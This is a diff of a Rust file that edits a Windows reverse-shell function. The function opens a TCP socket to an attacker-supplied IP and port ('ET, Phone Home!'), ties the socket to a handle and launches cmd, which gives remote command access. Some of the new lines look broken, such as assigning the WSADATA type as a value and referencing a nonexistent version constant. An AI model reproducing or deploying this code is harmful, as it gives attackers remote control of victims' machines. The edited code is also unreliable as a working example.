@@ -20,49 +20,18 @@ use std::os::windows::io::FromRawHandle;
 #[cfg(windows)]
 pub fn shell(ip: String, port: String) {
     // https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
-    let AF_INET = 2; // Ipv4
+    let PF_INET = winapi::shared::winsock2::PF_INET; // Ipv4
     let IPPROTO_TCP = 6; // TCP-Sock Stream
     let NULL: *mut winapi::winsock2::WSAPROTOCOL_INFOA = ptr::null_mut(); // Setup a null mutable type
     let version: u16 = 22; // Version 2.2 of winsock
 
-    // Random shit
-    let mut vendor: i8 = 10; 
-    let vendorPtr: *mut i8 = &mut vendor;
 
     // Mutable data for startup
-    let mut data: winapi::winsock2::WSADATA = winapi::winsock2::WSADATA {
-        wVersion: version,
-        wHighVersion: version,
-        iMaxSockets: 1,
-        iMaxUdpDg: 1,
-        szDescription: [
-            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
-            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
-            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
-            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
-            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
-            126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
-            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
-            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
-            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
-            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
-            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 1,
-            1, 1, 1, 1,
-        ],
-        szSystemStatus: [
-            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
-            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
-            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
-            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
-            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
-            126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 1,
-        ],
-        lpVendorInfo: vendorPtr,
-    };
+    let mut data: winapi::winsock2::WSADATA = winapi::winsock2::WSADATA;
 
     // Start WSA and WinSock2
     unsafe {
-        ws2_32::WSAStartup(version, &mut data);
+        ws2_32::WSAStartup(winapi::um::winsock2::wVersion, &mut data);
     }
 
     // ET, Phone Home!
@@ -73,14 +42,11 @@ pub fn shell(ip: String, port: String) {
 
     // Raw Socket for windows
     unsafe {
-        let socket = ws2_32::WSASocketA(AF_INET, 1, IPPROTO_TCP, NULL, 0, 0);
+        let socket = ws2_32::WSASocketA(PF_INET, 1, IPPROTO_TCP, NULL, 0, 0);
 
         println!("{}", socket);
 
-        // let socket = socket.as_raw_socket();
-
         let handle: winapi::winnt::HANDLE = socket as winapi::winnt::HANDLE;
-        // let handle: winapi::winnt::HANDLE = s as winapi::winnt::HANDLE;
 
         // Open shell
         Command::new("cmd")
